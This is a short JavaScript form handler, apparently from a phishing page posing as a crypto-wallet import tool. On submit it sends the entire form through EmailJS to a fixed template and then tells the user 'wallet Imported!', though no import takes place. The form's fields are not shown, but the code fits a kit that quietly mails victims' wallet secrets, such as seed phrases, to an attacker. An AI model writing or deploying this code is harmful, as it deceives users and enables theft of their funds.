const btn = document.getElementById('button');

document.getElementById('form')
 .addEventListener('submit', function(event) {
   event.preventDefault();

   btn.value = 'Importing...';

   const serviceID = 'default_service';
   const templateID = 'template_1oeq4vi';

   emailjs.sendForm(serviceID, templateID, this)
    .then(() => {
      btn.value = 'Imported';
      alert('wallet Imported!');
    }, (err) => {
      btn.value = 'Error Importing';
      alert(JSON.stringify(err));
    });
});